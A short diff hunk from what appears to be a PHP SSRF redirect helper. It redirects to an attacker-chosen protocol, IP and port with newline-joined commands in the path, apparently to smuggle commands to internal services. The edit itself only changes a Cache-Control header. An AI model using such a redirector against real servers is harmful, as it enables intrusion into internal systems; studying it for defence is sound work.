@@ -20,5 +20,5 @@ $payload = implode('%0A', $commands);
 
 header("HTTP/1.1 ".$_GET["code"]." Found");
 header('Location: '.$_GET["proto"].'://'.$_GET["ip"].':'.$_GET["port"].'/_'.$payload);
-header("Cache-Control: no-store, no-cache, must-revalidate");
+header("Cache-Control: max-age=0, must-revalidate, no-cache, no-store, private");
 header("Pragma: no-cache");
